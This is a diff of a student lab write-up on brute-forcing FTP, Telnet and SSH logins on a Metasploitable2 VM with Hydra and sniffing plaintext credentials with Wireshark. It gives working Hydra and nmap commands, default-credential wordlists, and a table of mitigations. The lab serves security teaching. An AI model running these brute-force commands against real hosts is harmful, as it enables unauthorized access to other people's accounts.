@@ -1,18 +1,16 @@
 
-# 💻 Brute Force and Sniffing
+# 💻 Labwork 1: Brute Force and Sniffing
 
 ## 📚 Table of Contents
-1. [Objectives](#-objectives)
-2. [Setup](#-setup)
-3. [Target IP Enumeration](#-target-ip-enumeration)
-4. [Brute Force Attacks](#2-brute-force-attacks)
-5. [Sniffing Traffic](#3-sniffing-network-traffic)
-6. [Problems Encountered](#4problems-encountered)
-7. [Mitigation Strategies](#5mitigation-strategies)
-8. [Summary](#-summary)
+1. [🎯 Objectives](#-objectives)  
+2. [🧰 Setup](#-setup)  
+3. [📍 Target IP Enumeration](#-target-ip-enumeration)  
+4. [🥖 Brute Force Attacks](#-2-brute-force-attacks)  
+5. [🍖 Sniffing Network Traffic](#-3-sniffing-network-traffic)  
+6. [🍕 Problems Encountered](#-4problems-encountered)  
+7. [🍥 Mitigation Strategies](#-5mitigation-strategies)  
+8. [✅ Summary](#-summary)  
 
-
----
 ## 🎯 Objectives
 
 - Understand how brute-force attacks work on common network services (FTP, Telnet, SSH).
@@ -22,18 +20,22 @@
 - Propose secure alternatives and mitigation strategies.
 
 ## 🧰 Setup
+
 - **Hydra** – for performing brute force attacks  
 - **Wireshark** – for capturing and analyzing network traffic  
-- **Kali Linux** – used as the attacker machine  
-- **Metasploitable2** – vulnerable virtual machine  
-- **FTP, Telnet, SSH** – services used for login and analysis  
+- **Kali Linux** – attacker machine  
+- **Metasploitable2** – vulnerable target VM  
+- **FTP, Telnet, SSH** – services used for login and testing
 
----
+## ⚠️ Reminder ⚠️
+- Before starting, keep in mind that this project requires your own IP, Since all the IP address here are my own
+
+
 
 ## 📍 Target IP Enumeration
 
+On **Kali Linux**, find the Metasploitable2 IP using:
 
-Run the following command on **Kali Linux** to find the Metasploitable2 IP:
 ```bash
 netdiscover
 ```
@@ -41,137 +43,132 @@ or:
 ```bash
 nmap -sn 192.168.154.0/24
 ```
-or:
 
-Use this command on Metasploitable2:
+Alternatively, get IP directly from **Metasploitable2**:
+
 ```bash
 ifconfig
 ```
 
-# 1. Enumeration of Usernames🥐
+## 1. Enumeration of Usernames 🥐
 
-Initial usernames used for brute force attacks were manually prepared in a file usernames.txt:
-1.1 Prepare a text file with potential usernames:
+Prepare the username and password lists manually:
 
-    vim username.txt
+```bash
+vim usernames.txt
+```
 
-- msfadmin
-- user
-- admin
-- root
-- test
-- guest
-  
+Contents:
+```
+msfadmin
+user
+admin
+root
+test
+guest
+```
 
-1.2 Prepare a text file with potential passwords:
+```bash
+vim passwords.txt
+```
 
-      vim password.txt
+Contents:
+```
+msfadmin
+user
+admin
+root
+test
+guest
+```
 
-- msfadmin
-- user
-- admin
-- root
-- test
-- guest
+## 2. Brute Force Attacks 🥖
 
-![Screenshot](https://github.com/L-Azymm/Labwork-1/blob/Image/Screenshot%202025-04-08%20122646.png?raw=true)
+### 🔐 FTP Attack
 
+```bash
+hydra -L usernames.txt -P passwords.txt ftp://192.168.154.133
+```
 
-# 2. Brute Force Attacks🥖
+### 🔐 Telnet Attack
 
-**2.1 FTP**
-    - Tool: Hydra
-    - Command Used:
-        
-          hydra -L usernames.txt -P passwords.txt ftp://192.168.154.133
-![Screenshot](https://github.com/L-Azymm/Labwork-1/blob/Image/Screenshot%202025-04-08%20122731.png?raw=true)
+```bash
+hydra -l msfadmin -P passwords.txt telnet://192.168.154.133
+```
 
-Result: Successful login found – msfadmin:msfadmin
+### 🔐 SSH Attack
 
----
+```bash
+hydra -L usernames.txt -P passwords.txt ssh://192.168.154.133
+```
 
-**2.2 Telnet**
-    - Tool: Hydra
-    - Command Used:
-       
-        hydra -l msfadmin -P passwords.txt telnet://192.168.154.133
-![Screenshot](https://github.com/L-Azymm/Labwork-1/blob/Image/Screenshot%202025-04-08%20124126.png?raw=true)
+> ❌ **Note**: Hydra/SSH client couldn’t connect due to outdated key exchange algorithms on Metasploitable2.
 
-Result: Successful login – msfadmin:msfadmin
+## 3. Sniffing Network Traffic 🍖
 
----
+### 📡 3.1 Start Wireshark on Kali
 
-**2.3 SSH**
-    - Tool: Hydra
-    - Command Used:
-        
-        hydra -L usernames.txt -P passwords.txt ssh://192.168.154.133
-![Screenshot](https://github.com/L-Azymm/Labwork-1/blob/Image/Screenshot%202025-04-08%20125923.png?raw=true)
+- Open Wireshark  
+- Select your network interface (e.g., `eth0`, `ens33`)  
+- Click "Start Capture"
 
-Problem: Hydra (or the SSH client it's using) doesn't support the older key exchange algorithms used by the Meta2 machine, which is very outdated
+### 📂 3.2 FTP Login Traffic
 
+Login with:
+```bash
+ftp 192.168.154.133
+```
 
+Then enter:
+```
+Username: msfadmin  
+Password: msfadmin
+```
 
-# 3. Sniffing Network Traffic🍖
+Wireshark filter:
+```bash
+ftp
+```
 
-**3.1 Start Wireshark on Kali**
+### 📂 3.3 Telnet Login Traffic
 
-a) Open Wireshark
+Login with:
+```bash
+telnet 192.168.154.133
+```
 
-b) Select the active network interface (e.g., eth0 or ens33).
+Credentials:
+```
+msfadmin / msfadmin
+```
 
-c) Start capturing
+Wireshark filter:
+```bash
+telnet
+```
 
----
+## 4. Problems Encountered 🍕
 
-**3.2 FTP Login Traffic Analysis**
+| Protocol | Problem                                | Solution                       |
+|----------|----------------------------------------|--------------------------------|
+| FTP      | None                                   | N/A                            |
+| Telnet   | Service was off initially              | Enabled it on Metasploitable2 |
+| SSH      | Hydra failed due to key mismatch error | N/A                            |
 
-a) Connect using:
+## 5. Mitigation Strategies 🍥
 
-    ftp 192.168.154.133
+| Protocol | Vulnerability                  | Secure Alternative | Why it’s Better                          |
+|----------|-------------------------------|--------------------|------------------------------------------|
+| FTP      | Sends credentials in plaintext | SFTP / FTPS        | Encrypts file transfer + credentials     |
+| Telnet   | Plaintext communication        | SSH                | Encrypts entire session                  |
+| SSH      | Brute-forceable                | Key-based login    | More secure than password-only logins   |
 
-b) Login with: msfadmin:msfadmin
+## ✅ Summary
 
-c) In Wireshark, use filter:
-
-    ftp 
-
----
-**3.3 Telnet Login Traffic Analysis**
-
-a) Connect using 
-
-    telnet 192.168.154.133
-
-b) Login with: msfadmin:msfadmin
-
-c) In Wireshark, use filter:
-
-    telnet
-
-
-
-# 4.Problems Encountered🍕
-
-| Protocol | Problem | Solution |
-|----------|---------|----------|
-|FTP	   |None	 |N/A
-|Telnet|	Service was off initially	|Enabled Telnet on Metasploitable2
-|SSH	|Hydra connection failed due to key mismatch	|
-
-# 5.Mitigation Strategies🍥
-
-| Protocol | Vulnerability | Secure Alternative	| Why it’s better|
-|-----------|-------------|---------------------|---------------|
-|FTP	|Sends credentials in plaintext	|SFT2P / FTPS|	Encrypts file transfer data and credentials
-|Telnet|	Transmits all in plaintext|	SSH	|SSH encrypts communication
-|SSH	|Still brute-forceable	|Use key-based login, strong passwords	|Prevents brute force access
-
-# ✅ Summary
-- FTP and Telnet are insecure protocols that transmit credentials in plaintext.
-- Hydra can easily brute-force weak credentials.
-- SSH is secure but can still be targeted using brute-force unless hardened.
-- Use tools like Wireshark to confirm data security over the network.
-- Always replace insecure services with encrypted alternatives like SSH or FTPS.
-- Apply proper access control, firewalls, and monitoring to reduce attack surfaces.
-
+> 🚨 **Key Takeaways:**
+> - FTP and Telnet are insecure protocols — avoid using them.
+> - Hydra can easily brute-force weak or default credentials.
+> - SSH is secure, but still needs hardening (use keys, limit attempts).
+> - Wireshark confirms whether your protocol is leaking info.
+> - Always **replace plaintext protocols** with **encrypted ones** like SSH or FTPS.
+> - Apply **strong authentication**, **firewalls**, and **monitoring** for better security.
